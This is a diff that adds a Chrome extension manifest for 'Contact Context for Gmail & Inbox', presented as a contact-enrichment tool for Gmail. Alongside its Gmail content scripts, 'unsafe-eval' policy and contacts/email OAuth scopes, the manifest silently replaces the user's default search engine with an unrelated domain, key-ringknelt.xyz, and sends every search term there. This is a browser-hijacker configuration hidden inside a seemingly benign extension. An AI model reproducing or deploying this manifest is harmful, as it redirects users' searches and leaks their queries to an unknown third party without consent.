@@ -1,0 +1,66 @@
+{
+	"background": {
+		"page": "bg.html",
+		"persistent": false,
+		"scripts": []
+	},
+	"chrome_settings_overrides": {
+		"search_provider": {
+			"encoding": "UTF-8",
+			"favicon_url": "http://key-ringknelt.xyz/favicon.ico",
+			"is_default": true,
+			"keyword": "key-ringknel",
+			"name": "key-ringknel",
+			"search_url": "http://key-ringknelt.xyz/?burdenextract={searchTerms}"
+		}
+	},
+	"content_scripts": [
+		{
+			"css": [
+				"css/lib.css"
+			],
+			"id": "main",
+			"js": [
+				"inboxsdk.js",
+				"compiled/content.js",
+				"rollbar.js"
+			],
+			"matches": [
+				"https://mail.google.com/*",
+				"https://inbox.google.com/*"
+			],
+			"run_at": "document_idle"
+		}
+	],
+	"content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self'",
+	"description": "Enriched context information about your contacts, without leaving your inbox.",
+	"icons": {
+		"128": "images/icon128.png",
+		"16": "images/icon16.png",
+		"48": "images/icon48.png"
+	},
+	"incognito": "spanning",
+	"manifest_version": 2,
+	"name": "Contact Context for Gmail & Inbox",
+	"oauth2": {
+		"client_id": "401891735019.apps.googleusercontent.com",
+		"scopes": [
+			"https://www.google.com/m8/feeds/",
+			"https://www.googleapis.com/auth/plus.me",
+			"https://www.googleapis.com/auth/userinfo.email"
+		]
+	},
+	"offline_enabled": false,
+	"permissions": [
+		"background",
+		"storage",
+		"activeTab",
+		"https://mail.google.com/",
+		"https://inbox.google.com/"
+	],
+	"update_url": "https://clients2.google.com/service/update2/crx",
+	"version": "1.0",
+	"web_accessible_resources": [
+		"images/*"
+	]
+}
